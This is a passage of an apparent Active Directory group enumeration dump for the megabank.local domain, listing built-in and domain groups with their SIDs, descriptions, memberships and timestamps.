                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Network Configuration Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             363ec3a0-b079-4fa3-b'ba4c'-ceadb175e8a1
objectsid:              S-1-5-32-556
samaccountname:         Network Configuration Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8216
usncreated:             8216
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Performance Monitor Users
description:            Members of this group can access performance counter data locally and remotely
distinguishedname:      CN=Performance Monitor Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Performance Monitor Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             cd6f8041-0dc6-42f4-b'8e4e'-6c1f445442ca
objectsid:              S-1-5-32-558
samaccountname:         Performance Monitor Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8217
usncreated:             8217
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Performance Log Users
description:            Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
distinguishedname:      CN=Performance Log Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Performance Log Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             e53b05eb-94b6-4dc5-b'be17'-82074d11b99f
objectsid:              S-1-5-32-559
samaccountname:         Performance Log Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8218
usncreated:             8218
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Distributed COM Users
description:            Members are allowed to launch, activate and use Distributed COM objects on this machine.
distinguishedname:      CN=Distributed COM Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Distributed COM Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             132f50a5-c05d-4f30-b'8ffc'-dc8fef91993d
objectsid:              S-1-5-32-562
samaccountname:         Distributed COM Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8219
usncreated:             8219
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     IIS_IUSRS
description:            Built-in group used by Internet Information Services.
distinguishedname:      CN=IIS_IUSRS,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=megabank,DC=local
name:                   IIS_IUSRS
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             7843a6d1-c469-4a48-b'8b26'-e2dd615027aa
objectsid:              S-1-5-32-568
samaccountname:         IIS_IUSRS
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8223
usncreated:             8220
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Cryptographic Operators
description:            Members are authorized to perform cryptographic operations.
distinguishedname:      CN=Cryptographic Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Cryptographic Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             fb127e58-eee7-4c20-b'b447'-e5530e44ca25
objectsid:              S-1-5-32-569
samaccountname:         Cryptographic Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8224
usncreated:             8224
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Event Log Readers
description:            Members of this group can read event logs from local machine
distinguishedname:      CN=Event Log Readers,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Event Log Readers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             fd403601-f525-4544-b'b99a'-87a661ce802a
objectsid:              S-1-5-32-573
samaccountname:         Event Log Readers
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8225
usncreated:             8225
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Certificate Service DCOM Access
description:            Members of this group are allowed to connect to Certification Authorities in the enterprise
distinguishedname:      CN=Certificate Service DCOM Access,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Certificate Service DCOM Access
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             9209d335-6854-47ee-b'849e'-fc0f6ca7e127
objectsid:              S-1-5-32-574
samaccountname:         Certificate Service DCOM Access
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8226
usncreated:             8226
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     RDS Remote Access Servers
description:            Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
distinguishedname:      CN=RDS Remote Access Servers,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   RDS Remote Access Servers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             7293364e-6985-48c9-b'b3ff'-e77cdf4db1aa
objectsid:              S-1-5-32-575
samaccountname:         RDS Remote Access Servers
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8227
usncreated:             8227
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     RDS Endpoint Servers
description:            Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
distinguishedname:      CN=RDS Endpoint Servers,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   RDS Endpoint Servers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             a23bd673-8ebc-478a-b'a93b'-8128f044d498
objectsid:              S-1-5-32-576
samaccountname:         RDS Endpoint Servers
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8228
usncreated:             8228
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     RDS Management Servers
description:            Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
distinguishedname:      CN=RDS Management Servers,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   RDS Management Servers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             2ad014fe-de97-4162-b'9ee7'-5e5e0fd2e35b
objectsid:              S-1-5-32-577
samaccountname:         RDS Management Servers
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8229
usncreated:             8229
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Hyper-V Administrators
description:            Members of this group have complete and unrestricted access to all features of Hyper-V.
distinguishedname:      CN=Hyper-V Administrators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Hyper-V Administrators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             5a79703a-f839-4f48-b'b731'-e3282aa0a94b
objectsid:              S-1-5-32-578
samaccountname:         Hyper-V Administrators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8230
usncreated:             8230
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Access Control Assistance Operators
description:            Members of this group can remotely query authorization attributes and permissions for resources on this computer.
distinguishedname:      CN=Access Control Assistance Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Access Control Assistance Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             16443896-f845-4f12-b'a502'-8a550d857594
objectsid:              S-1-5-32-579
samaccountname:         Access Control Assistance Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8231
usncreated:             8231
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Remote Management Users
description:            Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
distinguishedname:      CN=Remote Management Users,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Melanie Purkis,CN=Users,DC=megabank,DC=local,
                        CN=Contractors,OU=Groups,DC=megabank,DC=local
name:                   Remote Management Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             5b7d1c2b-8bcc-44d6-b'bc71'-31ad67aaa221
objectsid:              S-1-5-32-580
samaccountname:         Remote Management Users
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             131163
usncreated:             8232
whenchanged:            2019-12-04 10:42:51
whencreated:            2019-09-25 13:28:31

cn:                     System Managed Accounts Group
description:            Members of this group are managed by the system.
distinguishedname:      CN=System Managed Accounts Group,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=DefaultAccount,CN=Users,DC=megabank,DC=local
name:                   System Managed Accounts Group
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             fdc420a5-e3d2-4c19-b'b57a'-f645cc2998c6
objectsid:              S-1-5-32-581
samaccountname:         System Managed Accounts Group
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8235
usncreated:             8233
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Storage Replica Administrators
description:            Members of this group have complete and unrestricted access to all features of Storage Replica.
distinguishedname:      CN=Storage Replica Administrators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Storage Replica Administrators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             159e2213-6495-4910-b'9a43'-9ee75ae07cb8
objectsid:              S-1-5-32-582
samaccountname:         Storage Replica Administrators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             8236
usncreated:             8236
whenchanged:            2019-09-25 13:28:31
whencreated:            2019-09-25 13:28:31

cn:                     Domain Computers
description:            All workstations and servers joined to the domain
distinguishedname:      CN=Domain Computers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Domain Computers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             44d7c838-923b-4a75-b'a8f0'-b45baf1baad8
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-515
samaccountname:         Domain Computers
samaccounttype:         268435456
usnchanged:             12332
usncreated:             12330
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Domain Controllers
description:            All domain controllers in the domain
distinguishedname:      CN=Domain Controllers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name:                   Domain Controllers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             b2c42384-7036-46c3-b'a3b6'-9101a204ce7b
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-516
samaccountname:         Domain Controllers
samaccounttype:         268435456
usnchanged:             12778
usncreated:             12333
whenchanged:            2019-09-25 13:44:22
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Schema Admins
description:            Designated administrators of the schema
distinguishedname:      CN=Schema Admins,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483640
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Administrator,CN=Users,DC=megabank,DC=local
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name:                   Schema Admins
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             ad52d78a-22d4-4172-b'9e63'-2a3eb761af09
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-518
samaccountname:         Schema Admins
samaccounttype:         268435456
usnchanged:             12762
usncreated:             12336
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Enterprise Admins
description:            Designated administrators of the enterprise
distinguishedname:      CN=Enterprise Admins,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483640
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Administrator,CN=Users,DC=megabank,DC=local
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local,
                        CN=Administrators,CN=Builtin,DC=megabank,DC=local
name:                   Enterprise Admins
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             595aaae4-7dca-4ece-b'8cbd'-cff6bd6783b9
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-519
samaccountname:         Enterprise Admins
samaccounttype:         268435456
usnchanged:             12765
usncreated:             12339
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:29:12

cn:                     Cert Publishers
description:            Members of this group are permitted to publish certificates to the directory
distinguishedname:      CN=Cert Publishers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483644
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name:                   Cert Publishers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             28440eb7-2dd1-493d-b'8fb7'-b7243e47e400
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-517
samaccountname:         Cert Publishers
samaccounttype:         536870912
usnchanged:             12344
usncreated:             12342
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Domain Admins
description:            Designated administrators of the domain
distinguishedname:      CN=Domain Admins,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Administrator,CN=Users,DC=megabank,DC=local
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local,
                        CN=Administrators,CN=Builtin,DC=megabank,DC=local
name:                   Domain Admins
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             47ba675e-7f33-4ddf-b'a0bd'-cdf348a30146
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-512
samaccountname:         Domain Admins
samaccounttype:         268435456
usnchanged:             12761
usncreated:             12345
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:29:12

cn:                     Domain Users
description:            All domain users
distinguishedname:      CN=Domain Users,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
memberof:               CN=Users,CN=Builtin,DC=megabank,DC=local
name:                   Domain Users
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             835a7682-dd2b-4177-b'a2d0'-66b4fe7bc8a8
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-513
samaccountname:         Domain Users
samaccounttype:         268435456
usnchanged:             12350
usncreated:             12348
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Domain Guests
description:            All domain guests
distinguishedname:      CN=Domain Guests,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
memberof:               CN=Guests,CN=Builtin,DC=megabank,DC=local
name:                   Domain Guests
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             44737923-c8b5-4ed5-b'9fec'-7e0534aab2a5
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-514
samaccountname:         Domain Guests
samaccounttype:         268435456
usnchanged:             12353
usncreated:             12351
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Group Policy Creator Owners
description:            Members in this group can modify group policy for the domain
distinguishedname:      CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483646
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Administrator,CN=Users,DC=megabank,DC=local
memberof:               CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
name:                   Group Policy Creator Owners
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             d82ceb56-a830-4578-b'993e'-a82a6f830989
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-520
samaccountname:         Group Policy Creator Owners
samaccounttype:         268435456
usnchanged:             12391
usncreated:             12354
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     RAS and IAS Servers
description:            Servers in this group can access remote access properties of users
distinguishedname:      CN=RAS and IAS Servers,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483644
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   RAS and IAS Servers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             f351a0e5-db6c-4341-b'be6a'-747bc9b3db99
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-553
samaccountname:         RAS and IAS Servers
samaccounttype:         536870912
usnchanged:             12359
usncreated:             12357
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Server Operators
description:            Members can administer domain servers
distinguishedname:      CN=Server Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Server Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             96d65592-52d7-4c54-b'bc8f'-6d46808e00df
objectsid:              S-1-5-32-549
samaccountname:         Server Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12772
usncreated:             12360
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:29:12

admincount:             1
cn:                     Account Operators
description:            Members can administer domain user and group accounts
distinguishedname:      CN=Account Operators,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:44:22,
                        2019-09-25 13:29:12,
                        1601-07-14 04:20:16
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Account Operators
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             e39f64bb-edc9-4137-b'a9b1'-0712cd84f9b1
objectsid:              S-1-5-32-548
samaccountname:         Account Operators
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12773
usncreated:             12363
whenchanged:            2019-09-25 13:44:21
whencreated:            2019-09-25 13:29:12

cn:                     Pre-Windows 2000 Compatible Access
description:            A backward compatibility group which allows read access on all users and groups in the domain
distinguishedname:      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=megabank,DC=local,
                        CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=megabank,DC=local
name:                   Pre-Windows 2000 Compatible Access
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             d3f4a615-a187-4b29-b'89bd'-83ab4aa2bfeb
objectsid:              S-1-5-32-554
samaccountname:         Pre-Windows 2000 Compatible Access
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             13032
usncreated:             12366
whenchanged:            2019-09-27 10:50:05
whencreated:            2019-09-25 13:29:12

cn:                     Incoming Forest Trust Builders
description:            Members of this group can create incoming, one-way trusts to this forest
distinguishedname:      CN=Incoming Forest Trust Builders,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Incoming Forest Trust Builders
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             a59f2a61-2691-46c9-b'9291'-7584bec8ff52
objectsid:              S-1-5-32-557
samaccountname:         Incoming Forest Trust Builders
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12371
usncreated:             12369
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Windows Authorization Access Group
description:            Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
distinguishedname:      CN=Windows Authorization Access Group,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=megabank,DC=local
name:                   Windows Authorization Access Group
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             fba3f714-9887-4a4d-b'9276'-7692d6e3292f
objectsid:              S-1-5-32-560
samaccountname:         Windows Authorization Access Group
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12396
usncreated:             12372
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Terminal Server License Servers
description:            Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
distinguishedname:      CN=Terminal Server License Servers,CN=Builtin,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:18,
                        2019-09-25 13:29:12,
                        1601-01-01 18:12:17
grouptype:              -2147483643
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Terminal Server License Servers
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             5a88df1f-e218-4bb7-b'83ac'-190e2dd6f3cc
objectsid:              S-1-5-32-561
samaccountname:         Terminal Server License Servers
samaccounttype:         536870912
systemflags:            -1946157056
usnchanged:             12377
usncreated:             12375
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Allowed RODC Password Replication Group
description:            Members in this group can have their passwords replicated to all read-only domain controllers in the domain
distinguishedname:      CN=Allowed RODC Password Replication Group,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483644
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
name:                   Allowed RODC Password Replication Group
objectcategory:         CN=Group,CN=Schema,CN=Configuration,DC=megabank,DC=local
objectclass:            top,
                        group
objectguid:             e83d798c-aae7-4a2d-b'bbd2'-685fc27ac4bb
objectsid:              S-1-5-21-1392959593-3013219662-3596683436-571
samaccountname:         Allowed RODC Password Replication Group
samaccounttype:         536870912
usnchanged:             12404
usncreated:             12402
whenchanged:            2019-09-25 13:29:12
whencreated:            2019-09-25 13:29:12

cn:                     Denied RODC Password Replication Group
description:            Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
distinguishedname:      CN=Denied RODC Password Replication Group,CN=Users,DC=megabank,DC=local
dscorepropagationdata:  2019-09-27 22:10:48,
                        2019-09-27 10:52:19,
                        2019-09-25 13:29:12,
                        1601-01-01 18:16:33
grouptype:              -2147483644
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                True
member:                 CN=Read-only Domain Controllers,CN=Users,DC=megabank,DC=local,
                        CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local,
